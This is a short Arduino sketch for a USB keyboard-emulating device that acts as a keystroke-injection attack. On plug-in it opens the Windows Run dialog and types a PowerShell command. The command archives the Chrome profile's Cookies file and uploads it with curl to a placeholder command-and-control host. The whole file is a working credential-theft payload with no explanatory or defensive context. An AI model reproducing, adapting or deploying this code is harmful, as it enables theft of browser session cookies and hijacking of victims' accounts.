#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  
  Keyboard.println(F("powershell -c \"Compress-Archive -Path \\\"$env:LocalAppData\\Google\\Chrome\\User Data\\Default\\Cookies\\\" -DestinationPath $env:TEMP\\Cookies.zip; curl -F 'file=@$env:TEMP\\Cookies.zip' http://C2_SERVER/upload\""));
}

void loop() {}
